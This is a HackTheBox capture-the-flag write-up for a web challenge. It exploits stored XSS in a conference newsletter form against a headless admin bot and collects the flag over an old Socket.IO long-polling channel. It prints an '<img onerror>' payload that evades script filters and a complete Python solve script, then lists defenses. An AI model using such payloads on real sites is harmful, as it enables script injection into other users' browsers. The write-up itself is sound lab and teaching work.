---
title: "Full Stack Conf"
date: 2027-03-25 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, stored-xss, socket.io, engine.io, headless-bot, cwe-79]
description: "An Easy Web challenge: a newsletter form stores your email unsanitized, a headless admin bot renders it and pops alert(), and the server pushes the flag back over an old socket.io (Engine.IO v3) channel that forces binary long-polling."
---

## Overview

`Full Stack Conf` is an Easy HackTheBox **Web** challenge. The site is a JS-conference landing
page with a "Stay up-to-date" newsletter form. The prompt is the whole hint: *"pop an alert() to
get the flag … the admin logs in and checks the emails regularly … we don't sanitize anything."*
The path is a [stored cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) bug
against a headless admin bot, with the flag delivered over a Socket.IO channel rather than printed
anywhere.

## The technique

The form does `POST /api/register {"email": ...}`. An internal admin panel — which we never see —
renders every registered `email` straight into the DOM with `innerHTML`, **unsanitized**. The admin
is a headless browser that visits that panel on an interval. The bottom of the public page wires up a
Socket.IO listener that `alert()`s a server-pushed `flag` event:

```js
const socket = io();
socket.on('flag', data => { console.log(data.flag); alert(data.flag); });
```

So there's no flag in any HTTP response — the server emits it when something pops an `alert()`.
Register an `email` that is actually HTML and you get [stored XSS](https://cwe.mitre.org/data/definitions/79.html):

```html
<img src=x onerror=alert(1)>
```

`<img onerror>` runs without `<script>`, so it sails past any `script`-keyword filter. When the bot
renders our row, `alert(1)` fires in its browser, and the server pushes the `flag` event to a room
keyed by the **registrant's IP** — which our exploit shares, since it registers and listens from the
same address.

The interesting twist is *receiving* the flag. The server is **socket.io 2.2.0 (Engine.IO v3)** on the
flask-socketio Werkzeug dev server, which **rejects the websocket transport with `400`**. That forces
EIO3 **long-polling**, and EIO3 polling frames are **binary** — `\x00` (string marker) + the length as
one byte per decimal digit + `\xff` + the packet bytes — nothing like the EIO4 `\x1e` separator. Stock
`python-socketio` only speaks EIO4 and won't connect, so we hand-roll the parser with `requests`. The bot
also runs on an interval, so the poll window has to stay open ~180 s.

## Solution

`solve.py` — open an EIO3 polling socket, register the XSS payload, and read the `flag` event:

```python
import sys, json, re, time, threading, requests
TARGET = sys.argv[1]; BASE = f"http://{TARGET}"
EIO = f"{BASE}/socket.io/?EIO=3&transport=polling"
PAYLOAD = '<img src=x onerror=alert(1)>'
flag = {"v": None}

def decode(buf):                       # walk EIO3 binary frames byte-wise
    i = 0
    while i < len(buf):
        i += 1; d = []
        while i < len(buf) and buf[i] != 0xff: d.append(buf[i]); i += 1
        i += 1; n = int("".join(str(x) for x in d) or "0")
        yield buf[i:i+n].decode("utf-8", "replace"); i += n

def poller():
    s = requests.Session()
    sid = next(json.loads(p[1:])["sid"]
               for p in decode(s.get(EIO, timeout=15).content) if p[:1] == "0")
    url = f"{EIO}&sid={sid}"
    end = time.time() + 180
    while time.time() < end and not flag["v"]:
        try: r = s.get(url, timeout=30)
        except requests.exceptions.ReadTimeout: continue
        for p in decode(r.content):
            if p == "2": s.post(url, data=b"\x00\x01\xff3")          # ping -> pong
            elif p.startswith("42"):
                m = re.search(r'HTB\{[^"}]+\}', p)
                if m: flag["v"] = m.group(0); return

threading.Thread(target=poller, daemon=True).start()
time.sleep(2)                                                       # connect first
requests.post(f"{BASE}/api/register", json={"email": PAYLOAD}, timeout=15)
for _ in range(185):
    if flag["v"]: print("[+] FLAG:", flag["v"]); break
    time.sleep(1)
```

Run it against the instance and the flag arrives once the admin bot makes its next pass:

```bash
python3 solve.py <host>:<port>
# [+] FLAG: HTB{...}
```

## Why it worked

User input is rendered with `innerHTML` and never encoded, so attacker HTML executes in the admin's
browser — a textbook [stored XSS](https://cwe.mitre.org/data/definitions/79.html) sink, and the
`<img onerror>` form dodges a `<script>`-only filter. The flag channel then authorizes delivery purely
on a re-used **source IP** instead of identity, so our injecting request and our listening socket — sharing
one NAT IP — both satisfy it. Knowing the Engine.IO version mattered too: EIO3 polling is binary-framed,
so a naive `str.split` parser silently sees nothing.

## Fix / defense

- **Output-encode** user input on render (`textContent` / templating autoescape); never `innerHTML` raw
  input. This kills the bug at the sink.
- Add a strict **Content-Security-Policy** (`script-src 'self'`, no inline handlers) so an injected
  `onerror` can't run.
- Don't gate a secret on a **source IP** — it's trivially shared behind NAT and proxies.
